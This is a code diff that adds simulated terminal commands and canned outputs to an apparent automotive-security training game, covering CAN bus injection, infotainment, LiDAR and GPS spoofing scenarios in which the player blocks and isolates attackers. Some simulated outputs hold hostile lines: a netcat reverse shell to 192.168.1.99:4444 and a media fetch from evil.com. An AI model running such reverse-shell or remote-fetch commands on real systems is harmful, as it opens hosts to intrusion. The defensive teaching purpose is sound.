@@ -20,6 +20,14 @@ export interface Attack {
   quiz: QuizQuestion[]
 }
 
+export interface Command{
+  id: string; 
+  command: string;
+  expectedOutput: string;
+  attackSlug: string;
+
+}
+
 export const attacks: Attack[] = [
   {
   
@@ -721,4 +729,329 @@ Click “Start Attack” to begin your mission.
       },
     ],
   },
+]
+
+
+export const commands: Command[] = [
+  {
+    id: "can-1",
+    command: "canmon",
+    expectedOutput: `[INFO] Monitoring CAN bus...
+   [DATA] ID 0x30: throttle=0.4
+   [DATA] ID 0x45: steer=0.2
+   [ALERT] ID 0x66: throttle=1.0 (suspicious)
+   [ALERT] ID 0x66: steer=1.0 (suspicious)`,
+  
+  
+    attackSlug: "can",
+    
+  },
+
+{
+    id: "can-2", 
+    command: "canlog --ids",
+    expectedOutput: `ID     Msg/s    Function
+    0x30   2.1      Throttle ECU
+    0x45   2.0      Steering ECU
+    0x66   9.9    Unknown - High frequency`,
+    attackSlug: "can"
+  },
+  {
+
+  id: "can-3", 
+    command: "canlog --id 0x66",
+    expectedOutput: `[LOG] 0x66 → throttle=1.0, steer=1.0
+    [LOG] 0x66 → throttle=1.0, steer=1.0
+    [LOG] 0x66 → throttle=1.0, steer=1.0`,
+    attackSlug: "can"
+},
+{
+
+  id: "can-4", 
+    command: "obdscan --devices",
+    expectedOutput: `[1] ECU: Engine Control Module
+    [2] ECU: Steering Control Module
+    [3] UNKNOWN DEVICE [ID 0x66] - source: OBD-II`,
+    attackSlug: "can"
+},
+{
+
+  id: "can-5", 
+    command: "canban block 0x66",
+    expectedOutput: "[SUCCESS] Blocked all messages from ID 0x66",
+    attackSlug: "can"
+},
+{
+
+  id: "can-6", 
+    command: "obdscan --remove 0x66",
+    expectedOutput: "[SUCCESS] Foreign device on OBD-II port isolated",
+    attackSlug: "can"
+},
+{
+
+  id: "can-7", 
+    command: "firewall --reload",
+    expectedOutput: `[INFO] Filtering rules reloaded
+    [SECURE] CAN bus stabilized. Manual control restored.`,
+    attackSlug: "can"
+},
+{
+
+  id: "multimedia-1", 
+    command: "multimeda-mon",
+    expectedOutput: `[INFO] Monitoring infotainment system logs...
+    [AUDIO] Playback triggered at 16:02:34
+    [SOURCE] HTTP Stream: http://evil.com/voice.mp3
+    [CHANNEL] Internal OS API call
+    [ALERT] Unexpected media request from remote IP: 100.82.45.111`,
+    attackSlug: "multimedia"
+},
+
+{
+
+  id: "multimedia-2", 
+    command: "netstat -tuln",
+    expectedOutput: `Proto  Local Address          State
+    tcp    0.0.0.0:8080           LISTEN  ←  Media API (Unauthenticated)
+    tcp    0.0.0.0:5555           LISTEN  ←  ADB Interface (Remote Debug)`,
+    attackSlug: "multimedia"
+},
+{
+
+  id: "multimedia-3", 
+    command: "netlog --last 10",
+    expectedOutput: `[16:02:34] Connection from 100.82.45.111 to port 8080
+    [16:02:35] POST /api/play { "file": "http://evil.com/voice.mp3" }`,
+    attackSlug: "multimedia"
+},
+{
+
+  id: "multimedia-4", 
+    command: "firewall --block 8080",
+    expectedOutput: "[✔] Port 8080 has been blocked from external access",
+    attackSlug: "multimedia"
+},
+{
+
+  id: "multimedia-5", 
+    command: "adbconfig --disable-remote",
+    expectedOutput: "[✔] Remote ADB access disabled",
+    attackSlug: "multimedia"
+},
+{
+
+  id: "multimedia-6", 
+    command: "media-sec --enforce-auth on",
+    expectedOutput: "[✔] All future media API calls now require authentication token",
+    attackSlug: "multimedia"
+},
+{
+
+  id: "multimedia-7", 
+    command: "netlog --blacklist 100.82.45.111",
+    expectedOutput: "[✔] IP 100.82.45.111 has been blacklisted from all future connections",
+    attackSlug: "multimedia"
+},
+{
+
+  id: "multimedia-8", 
+    command: "multimeda-mon",
+    expectedOutput: `[STATUS] No suspicious playback
+    [STATUS] Media API: Secured
+    [STATUS] Remote ADB: Disabled`,
+    attackSlug: "multimedia"
+},
+{
+
+  id: "remote-1", 
+    command: "canmon --watch",
+    expectedOutput: `[DATA] ID 0x21A: 01FF000000000000 ← Lights ON
+    [DATA] ID 0x130: FF00000000000000 ← Throttle
+   [ALERT] Repeated spoofed signals from internal system`,
+    attackSlug: "remote"
+},
+{
+
+  id: "remote-2", 
+    command: "ip link show",
+    expectedOutput: "can0: <UP,LOWER_UP> mtu 16 ...",
+    attackSlug: "remote"
+},
+{
+
+  id: "remote-3", 
+    command: "ps aux | grep nc",
+    expectedOutput: "/bin/nc -e /bin/sh 192.168.1.99 4444",
+    attackSlug: "remote"
+},
+{
+
+  id: "remote-4", 
+    command: "ip link set can0 down",
+    expectedOutput: "[✔] CAN interface can0 disabled",
+    attackSlug: "remote"
+},
+{
+
+  id: "remote-5", 
+    command: "firewall --block-ports 8080 5555 6667",
+    expectedOutput: "Command executed successfully",
+    attackSlug: "remote"
+},
+{
+
+  id: "remote-6", 
+    command: "api-sec --require-auth infotainment",
+    expectedOutput: "Command executed successfully",
+    attackSlug: "remote"
+},
+{
+
+  id: "remote-7", 
+    command: "netlog --blacklist 192.168.1.99",
+    expectedOutput: "Command executed successfully",
+    attackSlug: "remote"
+},
+{
+
+  id: "remote-8", 
+    command: "system-status",
+    expectedOutput: `[STATUS] CAN Interface: OFF
+    [STATUS] Remote Access Ports: Secured
+    [STATUS] No unauthorized process detected`,
+    attackSlug: "remote"
+},
+
+{
+
+  id: "lidar-1", 
+    command: "lidar-mon --live",
+    expectedOutput: `[ALERT] Repeated fake obstacle @ 2.5m
+    [ALERT] LiDAR blackout detected: 0 points returned`,
+    attackSlug: "lidar"
+},
+{
+
+  id: "lidar-2", 
+    command: "netstat -anu | grep 2368",
+    expectedOutput: "udp  0  0 0.0.0.0:2368  0.0.0.0:*  ←  Unfiltered LiDAR stream port",
+    attackSlug: "lidar"
+},
+{
+
+  id: "lidar-3", 
+    command: "tcpdump -i eth0 port 2368 -c 5",
+    expectedOutput: "16:01:21 IP 192.168.1.44 > 192.168.1.10.2368",
+    attackSlug: "lidar"
+},
+{
+
+  id: "lidar-4", 
+    command: "ufw deny from 192.168.1.44 to any port 2368",
+    expectedOutput: "Command executed successfully",
+    attackSlug: "lidar"
+},
+{
+
+  id: "lidar-5", 
+    command: "ufw allow from 192.168.1.100 to any port 2368",
+    expectedOutput: "Command executed successfully",
+    attackSlug: "lidar"
+},
+{
+
+  id: "lidar-6", 
+    command: "ufw deny to any port 2368",
+    expectedOutput: "Command executed successfully",
+    attackSlug: "lidar"
+},
+{
+
+  id: "lidar-7", 
+    command: "lidar-sec --trusted-ip 192.168.1.100",
+    expectedOutput: "Command executed successfully",
+    attackSlug: "lidar"
+},
+{
+
+  id: "lidar-8", 
+    command: "systemctl restart lidar-stream",
+    expectedOutput: "Command executed successfully",
+    attackSlug: "lidar"
+},
+{
+
+  id: "lidar-9", 
+    command: "lidar-status",
+    expectedOutput: `[STATUS] LiDAR: Normal
+    [STATUS] Packet source: 192.168.1.100 (verified)
+    [STATUS] Port 2368: Secured`,
+    attackSlug: "lidar"
+},
+{
+
+  id: "gps-1", 
+    command: "gpsmon --live",
+    expectedOutput: "[ALERT] Sudden GPS jump: 900+ km shift detected",
+    attackSlug: "gps"
+},
+{
+
+  id: "gps-2", 
+    command: "netstat -tuln | grep LISTEN",
+    expectedOutput: "tcp  0  0 0.0.0.0:5555  0.0.0.0:*  LISTEN",
+    attackSlug: "gps"
+},
+{
+
+  id: "gps-3", 
+    command: "gpslog --last 10",
+    expectedOutput: "[15:22:04] Coordinates injected: 41.9028, 12.4964",
+    attackSlug: "gps"
+},
+{
+
+  id: "gps-4", 
+    command: "ufw deny from 192.168.1.72 to any port 5555",
+    expectedOutput: "[✔] IP blocked",
+    attackSlug: "gps"
+},
+{
+
+  id: "gps-5", 
+    command: "gps-sec --restrict --ip 127.0.0.1",
+    expectedOutput: "[✔] API restricted to localhost",
+    attackSlug: "gps"
+},
+{
+
+  id: "gps-6", 
+    command: "gps-sec --auth enable --token xyz123",
+    expectedOutput: "[✔] Auth token required for GPS updates",
+    attackSlug: "gps"
+},
+{
+
+  id: "gps-7", 
+    command: "gps-reset --to-last-good",
+    expectedOutput: "Command executed successfully",
+    attackSlug: "gps"
+},
+{
+
+  id: "gps-8", 
+    command: "systemctl restart nav-stack",
+    expectedOutput: "[✔] Navigation restarted",
+    attackSlug: "gps"
+},
+{
+
+  id: "gps-9", 
+    command: "gps-status",
+    expectedOutput: `[STATUS] GPS: Verified  
+    [STATUS] Source IP: 127.0.0.1 (trusted)  
+    [STATUS] Port 5555: Secured`,
+    attackSlug: "gps"
+},
 ]
